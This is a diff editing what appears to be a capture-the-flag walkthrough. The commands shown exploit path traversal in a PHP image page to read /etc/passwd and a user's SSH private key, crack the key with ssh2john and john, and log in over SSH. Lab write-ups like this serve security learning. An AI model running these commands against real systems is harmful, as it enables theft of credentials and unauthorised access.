@@ -21,11 +21,10 @@ gobuster -w [Your_word_list] -u [webpage] -x [file_type]
 We find a page for displaying images which can be exploited for a path traversal.
 ```
 curl http//webpage/imagedisplaying.php?i=../../../../etc/passwd
-curl http//webpage/imagedisplaying.php?i=../../../../home/tom/.ssh/id_rsa > id_rsa (then delete the html part)
+curl http//webpage/imagedisplaying.php?i=../../../../home/tom/.ssh/id_rsa > id_rsa
 curl http//webpage/imagedisplaying.php?i=../../../../home/tom/user.txt
 chmod 600 id_rsa
 ssh2john id_rsa
 john id_rsa --wordlist=rockyou.txt
 ssh tom@IP -i id_rsa
 ```
-And thats how you pwn User :)
